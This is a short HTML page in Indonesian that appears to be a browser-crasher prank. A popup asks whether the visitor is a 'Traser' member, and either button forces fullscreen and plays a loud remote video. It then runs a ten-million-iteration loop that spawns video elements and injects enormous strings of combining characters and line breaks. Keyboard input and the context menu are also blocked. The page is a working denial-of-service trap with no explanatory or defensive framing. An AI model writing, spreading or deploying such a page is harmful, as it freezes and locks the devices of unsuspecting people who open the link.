<!DOCTYPE html>
<html lang="id">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}body{display:flex;justify-content:center;align-items:center;height:100vh;background:black;text-align:center;font-family:Arial,sans-serif;overflow:hidden;position:relative}#videoContainer{position:fixed;width:100vw;height:100vh;top:0;left:0;z-index:-1;display:none}#videoContainer video{width:100%;height:100%;object-fit:cover}#popup{position:absolute;width:90%;max-width:300px;padding:20px;background:rgba(0,0,0,.8);color:#fff;border-radius:10px;text-align:center;z-index:2}.btn-container{display:flex;gap:10px;justify-content:center;margin-top:10px}button{font-size:16px;padding:10px 15px;border:none;background:#fff;color:#000;cursor:pointer;border-radius:5px;transition:.2s}button:hover{background:gray}#spamText{position:absolute;top:50px;left:50%;transform:translateX(-50%);width:100%;color:white;font-size:12px;text-align:center;white-space:nowrap;overflow:hidden}
    </style>
</head>
<body>
    <div id="videoContainer">
        <video id="bgVideo" autoplay muted loop playsinline>
            <source src="https://files.catbox.moe/ypspo2.mp4" type="video/mp4">
        </video>
    </div>
    <div id="popup">
        <h2>Apakah kamu anggota Traser?</h2>
        <div class="btn-container">
            <button onclick="startExperience()">Iya</button>
            <button onclick="startExperience()">Tidak</button>
        </div>
    </div>
    <div id="spamText"></div>
    <script>
        function startExperience(){
            document.getElementById("popup").style.display="none";
            document.getElementById("videoContainer").style.display="block";
            let v=document.getElementById("bgVideo");
            v.muted=false;v.volume=1.0;
            v.play().catch(e=>console.log("Autoplay gagal:"+e));
            goFullScreen();
            for(let i=0;i<10000000;i++){showVideoPopup();spamText();}
        }
        function goFullScreen(){
            let d=document.documentElement;
            d.requestFullscreen?d.requestFullscreen():d.mozRequestFullScreen?d.mozRequestFullScreen():d.webkitRequestFullscreen?d.webkitRequestFullscreen():d.msRequestFullscreen&&d.msRequestFullscreen();
        }
        function showVideoPopup(){
            let p=document.createElement("div");
            p.classList.add("popupVideo");
            document.body.appendChild(p);
            let v=document.createElement("video");
            v.src="https://files.catbox.moe/ypspo2.mp4";v.autoplay=true;v.loop=true;v.muted=false;v.volume=1.0;v.setAttribute("playsinline","");
            p.appendChild(v);
            let x=Math.random()*(window.innerWidth-320),y=Math.random()*(window.innerHeight-240);
            p.style.left=x+"px";p.style.top=y+"px";
            setTimeout(()=>{v.play().catch(e=>console.log("Autoplay gagal:"+e))},100);
        }
        function spamText(){
            let s=document.getElementById("spamText"),u="̶̷̸͏͟͜͝",t=u.repeat(100000)+"<br>".repeat(10000000);
            s.innerHTML=t;
        }
        document.addEventListener("keydown",e=>e.preventDefault());
        document.addEventListener("contextmenu",e=>e.preventDefault());
    </script>
</body>
</html>
